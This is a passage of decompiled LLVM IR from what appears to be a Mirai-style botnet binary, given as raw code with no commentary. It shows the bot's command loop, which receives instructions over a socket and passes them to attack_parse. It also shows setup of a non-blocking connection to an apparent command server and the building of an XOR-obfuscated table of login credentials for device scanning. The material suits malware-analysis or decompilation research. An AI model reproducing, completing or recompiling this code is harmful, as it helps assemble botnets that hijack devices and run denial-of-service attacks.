  %v0_804e9af = load i32, i32* %eax.global-to-local, align 4
  %v2_804e9af = add i32 %v0_804e9aa, -8
  %v3_804e9af = inttoptr i32 %v2_804e9af to i32*
  store i32 %v0_804e9af, i32* %v3_804e9af, align 4
  %v1_804e9b0 = add i32 %v0_804e9aa, 24
  %v2_804e9b4 = add i32 %v0_804e9aa, -12
  %v3_804e9b4 = inttoptr i32 %v2_804e9b4 to i32*
  store i32 %v1_804e9b0, i32* %v3_804e9b4, align 4
  %v0_804e9b5 = load i32, i32* @global_var_8057b98.39, align 8
  store i32 %v0_804e9b5, i32* %eax.global-to-local, align 4
  %v2_804e9ba = add i32 %v0_804e9aa, -16
  %v3_804e9ba = inttoptr i32 %v2_804e9ba to i32*
  store i32 %v0_804e9b5, i32* %v3_804e9ba, align 4
  %v0_804e9bb = call i32 @__libc_recv()
  store i32 %v0_804e9bb, i32* %eax.global-to-local, align 4
  %v0_804e9c0 = load i32, i32* @esp, align 4
  %v1_804e9c0 = add i32 %v0_804e9c0, 16
  %v10_804e9c3 = icmp eq i32 %v0_804e9bb, -1
  br i1 %v10_804e9c3, label %dec_label_pc_804e928, label %dec_label_pc_804e9cc

dec_label_pc_804e9cc:                             ; preds = %dec_label_pc_804e99f
  %v1_804e9cc = icmp eq i32 %v0_804e9bb, 0
  br i1 %v1_804e9cc, label %dec_label_pc_804e93c, label %dec_label_pc_804e9d4

dec_label_pc_804e9d4:                             ; preds = %dec_label_pc_804e9cc
  %v1_804e9d4 = add i32 %v0_804e9c0, 12
  %v2_804e9d4 = inttoptr i32 %v1_804e9d4 to i32*
  store i32 16384, i32* %v2_804e9d4, align 4
  %v1_804e9d9 = add i32 %v0_804e9c0, 8
  %v2_804e9d9 = inttoptr i32 %v1_804e9d9 to i32*
  store i32 2, i32* %v2_804e9d9, align 4
  %v1_804e9db = add i32 %v0_804e9c0, 1430
  store i32 %v1_804e9db, i32* %edx.global-to-local, align 4
  %v2_804e9e2 = add i32 %v0_804e9c0, 4
  %v3_804e9e2 = inttoptr i32 %v2_804e9e2 to i32*
  store i32 %v1_804e9db, i32* %v3_804e9e2, align 4
  %v0_804e9e3 = load i32, i32* @global_var_8057b98.39, align 8
  store i32 %v0_804e9e3, i32* @edi, align 4
  %v3_804e9e9 = inttoptr i32 %v0_804e9c0 to i32*
  store i32 %v0_804e9e3, i32* %v3_804e9e9, align 4
  %v0_804e9ea = call i32 @__libc_recv()
  store i32 %v0_804e9ea, i32* %eax.global-to-local, align 4
  %v0_804e9ef = load i32, i32* @esp, align 4
  %v1_804e9ef = add i32 %v0_804e9ef, 1430
  %v2_804e9ef = inttoptr i32 %v1_804e9ef to i16*
  %v3_804e9ef = load i16, i16* %v2_804e9ef, align 2
  %v2_804e9f7 = call i16 @llvm.bswap.i16(i16 %v3_804e9ef)
  %v3_804e9f7 = zext i16 %v2_804e9f7 to i32
  store i16 %v2_804e9f7, i16* %v2_804e9ef, align 2
  store i32 %v3_804e9f7, i32* %eax.global-to-local, align 4
  %v0_804ea08 = load i32, i32* @esp, align 4
  %v1_804ea08 = add i32 %v0_804ea08, -4
  %v2_804ea08 = inttoptr i32 %v1_804ea08 to i32*
  store i32 16384, i32* %v2_804ea08, align 4
  %v0_804ea0d = load i32, i32* %eax.global-to-local, align 4
  %v2_804ea0d = add i32 %v0_804ea08, -8
  %v3_804ea0d = inttoptr i32 %v2_804ea0d to i32*
  store i32 %v0_804ea0d, i32* %v3_804ea0d, align 4
  %v1_804ea0e = add i32 %v0_804ea08, 40
  %v2_804ea12 = add i32 %v0_804ea08, -12
  %v3_804ea12 = inttoptr i32 %v2_804ea12 to i32*
  store i32 %v1_804ea0e, i32* %v3_804ea12, align 4
  %v0_804ea13 = load i32, i32* @global_var_8057b98.39, align 8
  store i32 %v0_804ea13, i32* %ecx.global-to-local, align 4
  %v2_804ea19 = add i32 %v0_804ea08, -16
  %v3_804ea19 = inttoptr i32 %v2_804ea19 to i32*
  store i32 %v0_804ea13, i32* %v3_804ea19, align 4
  %v0_804ea1a = call i32 @__libc_recv()
  store i32 %v0_804ea1a, i32* %eax.global-to-local, align 4
  %v0_804ea1f = load i32, i32* @esp, align 4
  %v1_804ea1f = add i32 %v0_804ea1f, 1446
  %v2_804ea1f = inttoptr i32 %v1_804ea1f to i16*
  %v3_804ea1f = load i16, i16* %v2_804ea1f, align 2
  %v4_804ea1f = zext i16 %v3_804ea1f to i32
  %v6_804ea1f = and i32 %v0_804ea1a, -65536
  %v7_804ea1f = or i32 %v4_804ea1f, %v6_804ea1f
  store i32 %v7_804ea1f, i32* %eax.global-to-local, align 4
  %v4_804ea2a = icmp eq i16 %v3_804ea1f, 0
  br i1 %v4_804ea2a, label %dec_label_pc_804e510.backedge, label %dec_label_pc_804ea33

dec_label_pc_804ea33:                             ; preds = %dec_label_pc_804e9d4
  store i32 %v4_804ea1f, i32* %eax.global-to-local, align 4
  %v0_804ea38 = load i32, i32* @edx, align 4
  %v2_804ea38 = add i32 %v0_804ea1f, 28
  %v3_804ea38 = inttoptr i32 %v2_804ea38 to i32*
  store i32 %v0_804ea38, i32* %v3_804ea38, align 4
  %v0_804ea39 = load i32, i32* @edx, align 4
  %v2_804ea39 = add i32 %v0_804ea1f, 24
  %v3_804ea39 = inttoptr i32 %v2_804ea39 to i32*
  store i32 %v0_804ea39, i32* %v3_804ea39, align 4
  %v0_804ea3a = load i32, i32* %eax.global-to-local, align 4
  %v2_804ea3a = add i32 %v0_804ea1f, 20
  %v3_804ea3a = inttoptr i32 %v2_804ea3a to i32*
  store i32 %v0_804ea3a, i32* %v3_804ea3a, align 4
  %v1_804ea3b = add i32 %v0_804ea1f, 56
  store i32 %v1_804ea3b, i32* %eax.global-to-local, align 4
  %v2_804ea3f = add i32 %v0_804ea1f, 16
  %v3_804ea3f = inttoptr i32 %v2_804ea3f to i32*
  store i32 %v1_804ea3b, i32* %v3_804ea3f, align 4
  %v0_804ea40 = call i32 @attack_parse()
  store i32 %v0_804ea40, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e510.backedge

; uselistorder directives
  uselistorder i32 %v4_804ea1f, { 1, 0 }
  uselistorder i32 %v1_804e9c0, { 1, 0 }
  uselistorder i32 %v0_804e9c0, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_804e9bb, { 1, 0, 2 }
  uselistorder i32 %v3_804e96d, { 1, 0 }
  uselistorder i32 %v0_804e93c, { 1, 0, 2 }
  uselistorder i32 %v0_804e94a, { 1, 0 }
  uselistorder i32 %v4_804e8f0, { 1, 0 }
  uselistorder i32 %v0_804e8f0, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_804e89a, { 1, 0 }
  uselistorder i32 %v0_804e885, { 4, 1, 2, 3, 0 }
  uselistorder i32 %v1_804e771, { 3, 2, 1, 0 }
  uselistorder i32 %v0_804e748, { 2, 0, 1 }
  uselistorder i32 %v0_804e72c, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v3_804e727, { 2, 0, 1, 3 }
  uselistorder i32 %v1_804e6ed, { 1, 0, 2 }
  uselistorder i32 %v0_804e6d9, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_804e6d4, { 1, 2, 0, 3 }
  uselistorder i32 %v0_804e695, { 1, 0 }
  uselistorder i32 %v1_804e692, { 1, 0 }
  uselistorder i32 %v2_804e68f, { 1, 0 }
  uselistorder i32 %v0_804e624, { 2, 1, 3, 0 }
  uselistorder i32 %v1_804e621, { 1, 0 }
  uselistorder i32 %v2_804e61e, { 1, 0 }
  uselistorder i32 %v0_804e67e, { 1, 0, 4, 8, 6, 5, 3, 2, 7 }
  uselistorder i32 %v0_804e5f1, { 1, 0 }
  uselistorder i32 %v1_804e5ee, { 1, 0 }
  uselistorder i32 %v2_804e5eb, { 1, 0 }
  uselistorder i32 %v0_804e5dc, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804e5a7, { 1, 2, 0, 3 }
  uselistorder i32 %v2_804e66e, { 1, 0 }
  uselistorder i32 %v1_804e66b, { 2, 1, 0 }
  uselistorder i32 %v1_804e720, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_804e540, { 1, 0 }
  uselistorder i32 %v2_804e535, { 1, 0 }
  uselistorder i32 %v1_804e532, { 1, 0 }
  uselistorder i32 %v0_804e520, { 0, 2, 1 }
  uselistorder i32 %v1_804e483, { 1, 0 }
  uselistorder i32 %v2_804e47b, { 2, 5, 0, 4, 3, 6, 1 }
  uselistorder i32 %v3_804e413, { 1, 0, 2 }
  uselistorder i32 %v2_804e3d0, { 1, 0, 2 }
  uselistorder i32 %v2_804e369, { 2, 1, 3, 4, 5, 7, 6, 8, 0, 9, 10, 11, 12 }
  uselistorder i32 %v2_804e35c, { 1, 0, 2 }
  uselistorder i32 %stack_var_-1444.0, { 1, 2, 3, 0 }
  uselistorder i32 %v2_804e315, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_804e28a, { 0, 2, 1, 3, 4 }
  uselistorder i32* %stack_var_-1452, { 7, 2, 1, 0, 6, 3, 4, 9, 8, 10, 5, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35 }
  uselistorder i32* %stack_var_-1456, { 3, 18, 2, 10, 9, 8, 21, 7, 17, 5, 15, 1, 11, 12, 20, 19, 22, 13, 4, 0, 23, 24, 25, 26, 27, 28, 29, 30, 31, 6, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 16, 45, 46, 47, 48, 49, 50, 51, 52, 53, 14, 54, 55, 56, 57, 58, 59, 60, 61, 62 }
  uselistorder i32* %stack_var_-1448, { 2, 1, 0, 3, 4, 6, 5, 7, 8, 9, 10, 11 }
  uselistorder i32* %stack_var_-32, { 1, 0, 3, 2 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 8, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 2, 8, 3, 5, 4, 6, 9, 7, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 48, 47, 49, 50, 51, 52, 53, 54, 55, 56, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 0, 57, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108 }
  uselistorder i32 1404, { 0, 2, 1, 3 }
  uselistorder i32 1430, { 2, 0, 3, 4, 1 }
  uselistorder i32 (i32)* @sleep, { 8, 7, 3, 4, 2, 1, 6, 5, 0 }
  uselistorder i32 1446, { 2, 1, 0 }
  uselistorder i8* @global_var_8057d30.40, { 3, 2, 1, 0 }
  uselistorder i32* @global_var_8057b98.39, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 0, 13, 14, 15, 16, 17, 19, 18, 20, 21 }
  uselistorder i32 ()* @watchdog_maintain, { 1, 0 }
  uselistorder i32 ()* @killer_init, { 1, 0 }
  uselistorder i32 ()* @attack_init, { 1, 0 }
  uselistorder i32 (i8*, i32)* @util_strcpy, { 4, 5, 30, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0, 1, 2, 3, 20, 21, 23, 22, 24, 25, 26, 28, 29, 27, 60, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59 }
  uselistorder i32 (i8*, i32)* @rand_alphastr, { 0, 10, 1, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 134537248, { 1, 0 }
  uselistorder i32 (i32, i32)* @bsd_signal, { 1, 0 }
  uselistorder label %dec_label_pc_804e89a, { 1, 0 }
  uselistorder label %dec_label_pc_804e890, { 1, 0 }
  uselistorder label %dec_label_pc_804e510.backedge, { 5, 12, 4, 11, 10, 3, 9, 2, 1, 8, 7, 0, 6 }
  uselistorder label %dec_label_pc_804e648, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_804e5dc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e580, { 1, 0 }
  uselistorder label %dec_label_pc_804e54d, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804e540, { 1, 0 }
  uselistorder label %dec_label_pc_804e32e, { 2, 0, 1 }
}

define i32 @rand_next(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804ea50 = load i32, i32* @global_var_8057d34.42, align 4
  %v0_804ea55 = load i32, i32* @global_var_8057d40.43, align 64
  store i32 %v0_804ea55, i32* @edx, align 4
  %v2_804ea5d = mul i32 %v0_804ea50, 2048
  %v2_804ea60 = xor i32 %v2_804ea5d, %v0_804ea50
  %v0_804ea62 = load i32, i32* @global_var_8057d38.44, align 8
  store i32 %v0_804ea62, i32* @global_var_8057d34.42, align 4
  %v0_804ea6c = load i32, i32* @global_var_8057d3c.45, align 4
  store i32 %v0_804ea6c, i32* @global_var_8057d38.44, align 8
  %v2_804ea78 = udiv i32 %v0_804ea55, 524288
  store i32 %v0_804ea55, i32* @global_var_8057d3c.45, align 4
  %v2_804ea81 = xor i32 %v2_804ea78, %v0_804ea55
  %v2_804ea83 = xor i32 %v2_804ea81, %v2_804ea60
  %v2_804ea85 = udiv i32 %v2_804ea60, 256
  store i32 %v2_804ea85, i32* @ecx, align 4
  %v2_804ea88 = xor i32 %v2_804ea83, %v2_804ea85
  store i32 %v2_804ea88, i32* @global_var_8057d40.43, align 64
  ret i32 %v2_804ea88

; uselistorder directives
  uselistorder i32 %v2_804ea85, { 1, 0 }
  uselistorder i32 %v0_804ea55, { 1, 2, 0, 3 }
  uselistorder i32 %v0_804ea50, { 1, 0 }
}

define i32 @rand_init() local_unnamed_addr {
entry:
  %v0_804ea90 = load i32, i32* @ebx, align 4
  %v2_804ea96 = call i32 @__GI_time(i32* null)
  store i32 %v2_804ea96, i32* @global_var_8057d34.42, align 4
  %v0_804eaa0 = call i32 @__getpid()
  %v0_804eaa7 = call i32 @getppid()
  %v1_804eaac = load i32, i32* @ebx, align 4
  %v2_804eaac = xor i32 %v1_804eaac, %v0_804eaa7
  store i32 %v2_804eaac, i32* @global_var_8057d38.44, align 8
  %v0_804eab3 = call i32 @clock()
  %v0_804eab8 = load i32, i32* @global_var_8057d38.44, align 8
  store i32 %v0_804eab3, i32* @global_var_8057d3c.45, align 4
  %v2_804eac3 = xor i32 %v0_804eab8, %v0_804eab3
  store i32 %v2_804eac3, i32* @global_var_8057d40.43, align 64
  store i32 %v0_804ea90, i32* @ebx, align 4
  ret i32 %v2_804eac3
}

define i32 @rand_alphastr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804ead0 = load i32, i32* @ebp, align 4
  %v0_804ead1 = load i32, i32* @edi, align 4
  %v0_804ead2 = load i32, i32* @esi, align 4
  %v0_804ead3 = load i32, i32* @ebx, align 4
  store i32 %v0_804ead3, i32* %stack_var_-16, align 4
  %v2_804eadd = call i32 @table_unlock_val(i8 61)
  %v3_804eae8 = call i32 @table_retrieve_val(i32 61, i32* null)
  store i32 %v3_804eae8, i32* @eax, align 4
  store i32 0, i32* @esi, align 4
  %v2_804eaf5 = bitcast i32* %stack_var_-48 to i8*
  %v3_804eaf5 = call i32 @strcpy(i8* %v2_804eaf5, i32 %v3_804eae8)
  %v1_804eafd = icmp eq i32 %arg2, 0
  br i1 %v1_804eafd, label %dec_label_pc_804eb67, label %dec_label_pc_804eb01

dec_label_pc_804eb01:                             ; preds = %entry
  %v4_804eb01 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804eb01, i32* @esi, align 4
  %v2_804eb05 = add i32 %v4_804eb01, %arg2
  store i32 %v2_804eb05, i32* @edi, align 4
  br label %dec_label_pc_804eb08

dec_label_pc_804eb08:                             ; preds = %dec_label_pc_804eb08, %dec_label_pc_804eb01
  %v0_804eb08 = load i32, i32* @global_var_8057d34.42, align 4
  %v2_804eb12 = mul i32 %v0_804eb08, 2048
  %v2_804eb16 = xor i32 %v2_804eb12, %v0_804eb08
  %v0_804eb18 = load i32, i32* @global_var_8057d38.44, align 8
  store i32 %v0_804eb18, i32* @global_var_8057d34.42, align 4
  %v0_804eb22 = load i32, i32* @global_var_8057d3c.45, align 4
  store i32 %v0_804eb22, i32* @global_var_8057d38.44, align 8
  %v0_804eb2c = load i32, i32* @global_var_8057d40.43, align 64
  store i32 %v0_804eb2c, i32* @global_var_8057d3c.45, align 4
  %v2_804eb38 = udiv i32 %v0_804eb2c, 524288
  %v2_804eb3f = udiv i32 %v2_804eb16, 256
  %v2_804eb3b = xor i32 %v2_804eb3f, %v2_804eb16
  %v2_804eb3d = xor i32 %v2_804eb3b, %v0_804eb2c
  %v2_804eb42 = xor i32 %v2_804eb3d, %v2_804eb38
  store i32 %v2_804eb42, i32* @ebx, align 4
  store i32 %v2_804eb42, i32* @global_var_8057d40.43, align 64
  %v2_804eb4a = call i32 @util_strlen(i8* %v2_804eaf5)
  %v0_804eb51 = load i32, i32* @ebx, align 4
  %tmp14 = urem i32 %v0_804eb51, %v2_804eb4a
  %v0_804eb59 = load i32, i32* @esp, align 4
  %v2_804eb59 = add i32 %tmp14, 28
  %v3_804eb59 = add i32 %v2_804eb59, %v0_804eb59
  %v4_804eb59 = inttoptr i32 %v3_804eb59 to i8*
  %v5_804eb59 = load i8, i8* %v4_804eb59, align 1
  %v2_804eb60 = load i32, i32* @esi, align 4
  %v3_804eb60 = inttoptr i32 %v2_804eb60 to i8*
  store i8 %v5_804eb59, i8* %v3_804eb60, align 1
  %v0_804eb62 = load i32, i32* @esi, align 4
  %v1_804eb62 = add i32 %v0_804eb62, 1
  store i32 %v1_804eb62, i32* @esi, align 4
  %v1_804eb63 = load i32, i32* @edi, align 4
  %v12_804eb63 = icmp eq i32 %v1_804eb62, %v1_804eb63
  %v1_804eb65 = icmp eq i1 %v12_804eb63, false
  br i1 %v1_804eb65, label %dec_label_pc_804eb08, label %dec_label_pc_804eb67.loopexit

dec_label_pc_804eb67.loopexit:                    ; preds = %dec_label_pc_804eb08
  %v2_804eb74.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_804eb67

dec_label_pc_804eb67:                             ; preds = %dec_label_pc_804eb67.loopexit, %entry
  %v2_804eb74 = phi i32 [ %v2_804eb74.pre, %dec_label_pc_804eb67.loopexit ], [ %v0_804ead3, %entry ]
  %v2_804eb6c = call i32 @table_lock_val(i8 61)
  store i32 %v2_804eb74, i32* @ebx, align 4
  store i32 %v0_804ead2, i32* @esi, align 4
  store i32 %v0_804ead1, i32* @edi, align 4
  store i32 %v0_804ead0, i32* @ebp, align 4
  ret i32 %v2_804eb6c

; uselistorder directives
  uselistorder i32 %v0_804eb2c, { 1, 0, 2 }
  uselistorder i32 %v2_804eb16, { 1, 0 }
  uselistorder i32 %v0_804eb08, { 1, 0 }
  uselistorder i8 61, { 1, 2, 0 }
}

define i32 @scanner_kill() local_unnamed_addr {
entry:
  %v0_804eb83 = load i32, i32* @global_var_805a878.46, align 8
  %v2_804eb8b = call i32 @kill(i32 %v0_804eb83, i32 9)
  ret i32 %v2_804eb8b
}

define i32 @setup_connection() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_804eba0 = load i32, i32* @ebx, align 4
  %v0_804eba1 = load i32, i32* @eax, align 4
  store i32 %v0_804eba1, i32* @ebx, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v1_804ebc6 = add i32 %v0_804eba1, 4
  %v2_804ebc6 = inttoptr i32 %v1_804ebc6 to i32*
  %v3_804ebc6 = load i32, i32* %v2_804ebc6, align 4
  store i32 %v3_804ebc6, i32* @eax, align 4
  %v10_804ebc9 = icmp eq i32 %v3_804ebc6, -1
  br i1 %v10_804ebc9, label %entry.dec_label_pc_804ebda_crit_edge, label %dec_label_pc_804ebce

entry.dec_label_pc_804ebda_crit_edge:             ; preds = %entry
  br label %dec_label_pc_804ebda

dec_label_pc_804ebce:                             ; preds = %entry
  %v1_804ebd2 = call i32 @__GI___libc_close(i32 %v3_804ebc6)
  br label %dec_label_pc_804ebda

dec_label_pc_804ebda:                             ; preds = %entry.dec_label_pc_804ebda_crit_edge, %dec_label_pc_804ebce
  %v3_804ebe1 = call i32 @socket(i32 2, i32 1, i32 0)
  %v1_804ebe9 = load i32, i32* @ebx, align 4
  %v2_804ebe9 = add i32 %v1_804ebe9, 4
  %v3_804ebe9 = inttoptr i32 %v2_804ebe9 to i32*
  store i32 %v3_804ebe1, i32* %v3_804ebe9, align 4
  %v8_804ebec = icmp eq i32 %v3_804ebe1, -1
  br i1 %v8_804ebec, label %dec_label_pc_804ebda.dec_label_pc_804ec63_crit_edge, label %dec_label_pc_804ebef

dec_label_pc_804ebda.dec_label_pc_804ec63_crit_edge: ; preds = %dec_label_pc_804ebda
  br label %dec_label_pc_804ec63

dec_label_pc_804ebef:                             ; preds = %dec_label_pc_804ebda
  %v0_804ebf1 = load i32, i32* @ebx, align 4
  %v1_804ebf1 = add i32 %v0_804ebf1, 28
  store i32 %v1_804ebf1, i32* @eax, align 4
  %v1_804ebf9 = add i32 %v0_804ebf1, 24
  %v2_804ebf9 = inttoptr i32 %v1_804ebf9 to i32*
  store i32 0, i32* %v2_804ebf9, align 4
  %v0_804ec00 = load i32, i32* @eax, align 4
  %v2_804ec01 = call i32 @util_zero(i32 %v0_804ec00, i32 256)
  %v0_804ec09 = load i32, i32* @ebx, align 4
  %v1_804ec09 = add i32 %v0_804ec09, 4
  %v2_804ec09 = inttoptr i32 %v1_804ec09 to i32*
  %v3_804ec09 = load i32, i32* %v2_804ec09, align 4
  %v3_804ec11 = call i32 @__libc_fcntl(i32 %v3_804ec09, i32 3, i32 0)
  %v0_804ec19 = load i32, i32* @ebx, align 4
  %v1_804ec19 = add i32 %v0_804ec19, 4
  %v2_804ec19 = inttoptr i32 %v1_804ec19 to i32*
  %v3_804ec19 = load i32, i32* %v2_804ec19, align 4
  %v12_804ec1c = or i32 %v3_804ec11, 2048
  %v3_804ec23 = call i32 @__libc_fcntl(i32 %v3_804ec19, i32 4, i32 %v12_804ec1c)
  %v0_804ec28 = load i32, i32* @ebx, align 4
  store i32 2, i32* %stack_var_-20, align 4
  %v0_804ec3e = load i32, i32* @global_var_8057d90.47, align 16
  %v2_804ec43 = add i32 %v0_804ec28, 8
  %v3_804ec43 = inttoptr i32 %v2_804ec43 to i32*
  store i32 %v0_804ec3e, i32* %v3_804ec43, align 4
  %v2_804ec46 = ptrtoint i32* %stack_var_-20 to i32
  %v0_804ec4d = load i32, i32* @ebx, align 4
  %v1_804ec4d = add i32 %v0_804ec4d, 4
  %v2_804ec4d = inttoptr i32 %v1_804ec4d to i32*
  %v3_804ec4d = load i32, i32* %v2_804ec4d, align 4
  store i32 %v3_804ec4d, i32* %edx.global-to-local, align 4
  %v1_804ec50 = add i32 %v0_804ec4d, 12
  %v2_804ec50 = inttoptr i32 %v1_804ec50 to i32*
  store i32 1, i32* %v2_804ec50, align 4
  %v0_804ec5a = load i32, i32* %edx.global-to-local, align 4
  %v3_804ec5b = call i32 @__libc_connect(i32 %v0_804ec5a, i32 %v2_804ec46, i32 16)
  br label %dec_label_pc_804ec63

dec_label_pc_804ec63:                             ; preds = %dec_label_pc_804ebda.dec_label_pc_804ec63_crit_edge, %dec_label_pc_804ebef
  %v0_804ec67 = phi i32 [ 0, %dec_label_pc_804ebda.dec_label_pc_804ec63_crit_edge ], [ %v3_804ec5b, %dec_label_pc_804ebef ]
  store i32 %v0_804eba0, i32* @ebx, align 4
  ret i32 %v0_804ec67

; uselistorder directives
  uselistorder i32 %v3_804ebc6, { 1, 0, 2 }
  uselistorder i32* %stack_var_-20, { 2, 0, 1 }
  uselistorder i32 (i32, i32)* @util_zero, { 11, 10, 9, 4, 3, 8, 7, 5, 6, 2, 1, 0 }
  uselistorder label %dec_label_pc_804ec63, { 1, 0 }
  uselistorder label %dec_label_pc_804ebda, { 1, 0 }
}

define i32 @add_auth_entry() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %v0_804ec70 = load i32, i32* @ebp, align 4
  %v0_804ec71 = load i32, i32* @edi, align 4
  %v0_804ec72 = load i32, i32* @esi, align 4
  %v0_804ec73 = load i32, i32* @ebx, align 4
  %v0_804ec77 = load i32, i32* @eax, align 4
  store i32 %v0_804ec77, i32* @esi, align 4
  %v0_804ec79 = load i32, i32* @global_var_8057d44.48, align 4
  %v0_804ec7f = load i32, i32* @edx, align 4
  %v1_804ec7e = mul i32 %v0_804ec79, 16
  %v2_804ec83 = add i32 %v1_804ec7e, 16
  store i32 %v2_804ec83, i32* %eax.global-to-local, align 4
  %v0_804ec86 = load i32, i32* @global_var_8057d88.49, align 8
  store i32 %v0_804ec86, i32* %edx.global-to-local, align 4
  %v0_804ec8c = load i32, i32* @ecx, align 4
  %v1_804ec8c = trunc i32 %v0_804ec8c to i16
  %v2_804ec93 = inttoptr i32 %v0_804ec86 to i32*
  %v3_804ec93 = call i32 @realloc(i32* %v2_804ec93, i32 %v2_804ec83)
  store i32 %v3_804ec93, i32* @global_var_8057d88.49, align 8
  %v0_804eca1 = load i32, i32* @global_var_8057d44.48, align 4
  store i32 %v0_804eca1, i32* %eax.global-to-local, align 4
  %v0_804eca6 = load i32, i32* @esi, align 4
  %v1_804ecad = inttoptr i32 %v0_804eca6 to i8*
  %v2_804ecad = call i32 @util_strlen(i8* %v1_804ecad)
  store i32 %v2_804ecad, i32* %eax.global-to-local, align 4
  %v1_804ecb2 = trunc i32 %v2_804ecad to i8
  store i32 %v2_804ecad, i32* @ebp, align 4
  %v1_804ecb4 = add i32 %v2_804ecad, 1
  store i32 %v1_804ecb4, i32* @ebx, align 4
  %v1_804ecba = call i32 @malloc(i32 %v1_804ecb4)
  store i32 %v1_804ecba, i32* %eax.global-to-local, align 4
  store i32 %v1_804ecba, i32* %edi.global-to-local, align 4
  %v0_804ecc4 = load i32, i32* @ebx, align 4
  %v0_804ecc5 = load i32, i32* @esi, align 4
  %v3_804ecc7 = call i32 @util_memcpy(i32 %v1_804ecba, i32 %v0_804ecc5, i32 %v0_804ecc4)
  store i32 %v3_804ecc7, i32* %eax.global-to-local, align 4
  %tmp25 = icmp slt i8 %v1_804ecb2, 1
  br i1 %tmp25, label %entry.dec_label_pc_804ecde_crit_edge, label %dec_label_pc_804ecd3

entry.dec_label_pc_804ecde_crit_edge:             ; preds = %entry
  %.pre = mul i32 %v2_804ecad, 16777216
  %.pre8 = sdiv i32 %.pre, 16777216
  br label %dec_label_pc_804ecde

dec_label_pc_804ecd3:                             ; preds = %entry
  store i32 0, i32* %eax.global-to-local, align 4
  %sext = mul i32 %v2_804ecad, 16777216
  %v2_804ecda = sdiv i32 %sext, 16777216
  br label %dec_label_pc_804ecd5

dec_label_pc_804ecd5:                             ; preds = %dec_label_pc_804ecd5, %dec_label_pc_804ecd3
  %v11_804ecd5 = phi i32 [ %v1_804ecd9, %dec_label_pc_804ecd5 ], [ 0, %dec_label_pc_804ecd3 ]
  %v1_804ecd5 = load i32, i32* %edi.global-to-local, align 4
  %v2_804ecd5 = add i32 %v1_804ecd5, %v11_804ecd5
  %v3_804ecd5 = inttoptr i32 %v2_804ecd5 to i8*
  %v4_804ecd5 = load i8, i8* %v3_804ecd5, align 1
  %v5_804ecd5 = xor i8 %v4_804ecd5, 80
  store i8 %v5_804ecd5, i8* %v3_804ecd5, align 1
  %v0_804ecd9 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ecd9 = add i32 %v0_804ecd9, 1
  store i32 %v1_804ecd9, i32* %eax.global-to-local, align 4
  %v13_804ecda = icmp eq i32 %v1_804ecd9, %v2_804ecda
  %v1_804ecdc = icmp eq i1 %v13_804ecda, false
  br i1 %v1_804ecdc, label %dec_label_pc_804ecd5, label %dec_label_pc_804ecde.loopexit

dec_label_pc_804ecde.loopexit:                    ; preds = %dec_label_pc_804ecd5
  br label %dec_label_pc_804ecde

dec_label_pc_804ecde:                             ; preds = %entry.dec_label_pc_804ecde_crit_edge, %dec_label_pc_804ecde.loopexit
  %v1_804ed09.pre-phi = phi i32 [ %.pre8, %entry.dec_label_pc_804ecde_crit_edge ], [ %v2_804ecda, %dec_label_pc_804ecde.loopexit ]
  store i32 %v3_804ec93, i32* %ecx.global-to-local, align 4
  %v2_804ece6 = mul i32 %v0_804eca1, 16
  %v0_804ece9 = load i32, i32* @global_var_8057d44.48, align 4
  %v2_804ecef = mul i32 %v0_804ece9, 16
  store i32 %v2_804ecef, i32* %ebx.global-to-local, align 4
  %v0_804ecfa = load i32, i32* @global_var_8057d88.49, align 8
  store i32 %v0_804ecfa, i32* %eax.global-to-local, align 4
  %v0_804ed06 = load i32, i32* %edi.global-to-local, align 4
  %v3_804ed06 = add i32 %v2_804ece6, %v3_804ec93
  %v4_804ed06 = inttoptr i32 %v3_804ed06 to i32*
